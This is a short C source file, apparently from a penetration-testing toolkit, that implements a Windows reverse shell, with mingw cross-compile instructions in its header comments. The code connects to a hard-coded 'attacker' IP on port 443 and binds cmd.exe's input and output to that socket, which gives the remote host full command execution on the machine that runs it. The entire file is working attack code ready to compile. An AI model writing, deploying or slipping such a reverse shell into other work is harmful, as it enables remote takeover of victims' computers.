/// <summary>
/// Windows Reverse Shell
/// apt-get install  mingw-w64
/// i686-w64-mingw32-gcc reverse-windows-shell.c -lws2_32 -o shell.exe 
/// </summary>
#include <winsock2.h> 
#include <stdio.h>  
#pragma comment(lib,"ws2_32") 

/// <summary>
/// Global Variables
/// </summary>
WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

/// <summary>
/// Main Function
/// </summary>
int main(int argc, char *argv[])
{
	/* Attackers IP and Port */
	char *rhost = "172.26.61.131";
	char *rport = "443";

	/* Windows Socket */
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	/* Socket Setup */
	struct hostent *host;
	host = gethostbyname(rhost);
	strcpy(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
	hax.sin_family = AF_INET;
	hax.sin_port = htons(atoi(rport));
	hax.sin_addr.s_addr = inet_addr(ip_addr);

	/* Socket Connect */
	WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	/* Bind to Shell*/
	memset(&ini_processo, 0, sizeof(ini_processo));
	ini_processo.cb = sizeof(ini_processo);
	ini_processo.dwFlags = STARTF_USESTDHANDLES;
	ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
	CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
}
